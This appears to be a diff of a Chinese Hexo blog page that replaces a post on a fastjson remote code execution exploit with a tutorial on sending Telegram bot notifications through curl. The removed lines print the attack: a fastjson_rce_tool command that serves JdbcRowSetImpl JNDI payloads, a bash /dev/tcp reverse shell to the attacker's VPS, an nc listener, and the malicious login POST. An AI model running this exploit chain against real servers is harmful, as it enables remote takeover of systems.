@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>fastjson_rce | Mr.Frame</title>
+  <title>Telegram | Mr.Frame</title>
   <meta name="keywords" content="">
-  <meta name="description" content="fastjson_rce | Mr.Frame">
+  <meta name="description" content="Telegram | Mr.Frame">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="404 Not Found: 该页面无法显示很抱歉，您所访问的地址并不存在">
 <meta property="og:type" content="website">
@@ -791,9 +791,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-fastjson-rce" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Telegram" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">fastjson_rce</h1>
+        <h1 class="article-title">Telegram</h1>
     
     <div class="article-meta">
         
@@ -803,9 +803,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Kali">Kali</a> > 
-            
-            <a  data-rel="Kali&lt;---&gt;Exploit">Exploit</a>
+            <a  data-rel="Tools">Tools</a>
             
         </span>
         
@@ -813,12 +811,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-01-29 16:09:51'>2021-01-29 16:09</time>
+            Created At : <time class="date" title='Updated At: 2021-04-09 12:42:22'>2021-04-09 12:42</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:393</span>
+        <span>Count:410</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -848,7 +846,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9Eurl"><span class="toc-text">漏洞url</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8vps-47-106-65-x-%E4%B8%8A%E7%94%9F%E6%88%90payload"><span class="toc-text">在vps(47.106.65.x)上生成payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8vps%E4%B8%8A%E7%9B%91%E5%90%AC999%E7%AB%AF%E5%8F%A3"><span class="toc-text">在vps上监听999端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%91%E9%80%81payload"><span class="toc-text">发送payload</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E7%94%B5%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%BB%99%E8%87%AA%E5%B7%B1%E6%88%96%E7%BE%A4%E7%BB%84%E5%8F%91%E6%B6%88%E6%81%AF-%E7%B1%BB%E4%BC%BC%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E9%80%81%E6%B6%88%E6%81%AF%E9%80%9A%E7%9F%A5"><span class="toc-text">如何通过电报机器人给自己或群组发消息(类似微信公众号推送消息通知)</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -868,46 +866,47 @@
 <ul>
 <li><input checked="" disabled="" type="checkbox"> </li>
 </ul>
-<h1 id="漏洞url"><a href="#漏洞url" class="headerlink" title="漏洞url"></a>漏洞url</h1><p><a target="_blank" rel="noopener" href="http://x.x.x.x/demo/login">http://x.x.x.x/demo/login</a> </p>
-<pre><code class="shell">POST /demo/login HTTP/1.1
-Host: x.x.x.x
-Content-Length: 35
-Accept: */*
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
-Content-Type: application/json
-Origin: http://106.14.21.5:31180
-Referer: http://106.14.21.5:31180/demo/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510
-Connection: close
+<p>Telegram（非正式簡稱TG）是跨平台的即時通訊软件</p>
+<h2 id="如何通过电报机器人给自己或群组发消息-类似微信公众号推送消息通知"><a href="#如何通过电报机器人给自己或群组发消息-类似微信公众号推送消息通知" class="headerlink" title="如何通过电报机器人给自己或群组发消息(类似微信公众号推送消息通知)"></a>如何通过电报机器人给自己或群组发消息(类似微信公众号推送消息通知)</h2><pre><code class="zsh">curl -X POST &quot;https://api.telegram.org/bot&lt;token&gt;/sendMessage&quot; -d &quot;chat_id=&lt;chat-id&gt;5&amp;text=&lt;message&gt;&quot;</code></pre>
+<p>所需参数</p>
+<ul>
+<li><p><em><token></em>  机器人token 类似于 1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo</p>
+</li>
+<li><p><em><chat-id></em> 会话id 类似于 509654615</p>
+</li>
+<li><p><em><message></em> 推送内容</p>
+</li>
+<li><p><input disabled="" type="checkbox">  创建Telegram机器人 获取Token (任意聊天窗口发送@BotFather，并点击此字符串即可)</p>
+<pre><code class="zsh">/start
+/newbot 
+&lt;bot_name&gt;         //机器人名字
+&lt;user_name&gt;_bot    //机器人ID  输入完毕后返回此机器人的Token 《1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo》
 
-&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;</code></pre>
-<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="在vps-47-106-65-x-上生成payload"><a href="#在vps-47-106-65-x-上生成payload" class="headerlink" title="在vps(47.106.65.x)上生成payload"></a>在vps(47.106.65.x)上生成payload</h2><p><a target="_blank" rel="noopener" href="https://github.com/wyzxxz/fastjson_rce_tool">fastjson_tool.jar</a></p>
-<pre><code class="shell">java -cp /tmp/fastjson_tool.jar fastjson.HRMIServer 47.106.65.x 1099 &quot;bash=bash -i &gt;&amp; /dev/tcp/47.106.65.x/9999 0&gt;&amp;1&quot;
+    Done! Congratulations on your new bot. You will find it at t.me/Bili_auto_checkIn_bot. You can now add a description, about section and profile picture for your bot, see /help for a list of commands. By the way, when you&#39;ve finished creating your cool bot, ping our Bot Support if you want a better username for it. Just make sure the bot is fully operational before you do this.
 
-[-] payload:  &#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;
-[-] payload:  &#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;&#125;
-[-] Opening JRMP listener on 1099
-...</code></pre>
-<h2 id="在vps上监听999端口"><a href="#在vps上监听999端口" class="headerlink" title="在vps上监听999端口"></a>在vps上监听999端口</h2><pre><code class="shell">nc -lvvp 999</code></pre>
-<h2 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h2><pre><code class="shell">POST /demo/login HTTP/1.1
-Host: x.x.x.x
-Content-Length: 184
-Accept: */*
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
-Content-Type: application/json
-Origin: http://x.x.x.x
-Referer: http://x.x.x.x/demo/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510
-Connection: close
+  Use this token to access the HTTP API:
+  1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo
+  Keep your token secure and store it safely, it can be used by anyone to control your bot.
 
-&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;&#125;
+  For a description of the Bot API, see this page: https://core.telegram.org/bots/api</code></pre>
+</li>
+<li><p><input disabled="" type="checkbox">  获取会话id (任意聊天窗口发送@userinfo，并点击此字符串)</p>
+<pre><code class="zsh">    @ethan1
+Id: 509654615
+  First: Ethan
+  Last: Hunter
+  Lang: en</code></pre>
+</li>
+<li><p><input disabled="" type="checkbox">  curl测试推送内容到机器人</p>
+<pre><code class="zsh">curl -X POST &quot;https://api.telegram.org/bot17020123420:AAGRfRacMKAtFHtM1XSpj477m33RSONKlPWo/sendMessage&quot; -d &quot;chat_id=509654615&amp;text=https://askding.github.io&quot;
 </code></pre>
+</li>
+</ul>
+<p>{<br>    “ok”: true,<br>    “result”: {<br>        “message_id”: 11,<br>        “from”: {<br>            “id”: 1702060320,<br>            “is_bot”: true,<br>            “first_name”: “Bili”,<br>            “username”: “Bili_auto_checkIn_bot”<br>        },<br>        “chat”: {<br>            “id”: 509654615,<br>            “first_name”: “Ethan”,<br>            “last_name”: “Hunter”,<br>            “username”: “et7an”,<br>            “type”: “private”<br>        },<br>        “date”: 1617958429,<br>        “text”: “<a target="_blank" rel="noopener" href="https://askding.github.io&quot;/">https://askding.github.io&quot;</a>,<br>        “entities”: [<br>            {<br>                “offset”: 0,<br>                “length”: 25,<br>                “type”: “url”<br>            }<br>        ]<br>    }<br>}</p>
+<pre><code>
+
+参考
+[如何通过电报机器人给自己或群组发消息](https://zhuanlan.zhihu.com/p/146062288)</code></pre>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com </span>
